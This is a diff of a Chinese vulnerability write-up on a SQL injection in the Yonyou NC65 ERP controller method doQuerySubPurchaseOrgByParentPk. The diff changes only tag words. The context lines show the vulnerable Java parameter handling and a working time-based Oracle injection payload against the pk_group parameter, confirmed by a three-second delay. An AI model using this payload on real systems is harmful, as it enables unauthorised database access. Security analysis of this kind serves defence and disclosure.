@@ -22,8 +22,6 @@ NC65
 
 直接看 `RegCommonController` 对应的 `doQuerySubPurchaseOrgByParentPk` 方法实现部分
 
-企业资源规划
-
 ```
 public Object doQuerySubPurchaseOrgByParentPk(HttpServletRequest request, HttpServletResponse response) {
         String pkGroup = request.getParameter("pk_group");
@@ -50,7 +48,7 @@ public List<OrgVO> queryRegisterOrgsFilterByName(String pkGroup, String filterNa
 
 又被带入 `queryRegisterOrgs` 方法，跟进
 
-数据管理
+企业资源规划
 
 ```
 public Map<String, RegisterOrgVO> queryRegisterOrgs(String pk_group) throws BusinessException {
@@ -90,4 +88,4 @@ pk_group=1' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE('any',3)--
 
 成功延时 3 秒
 
-网络
+软件
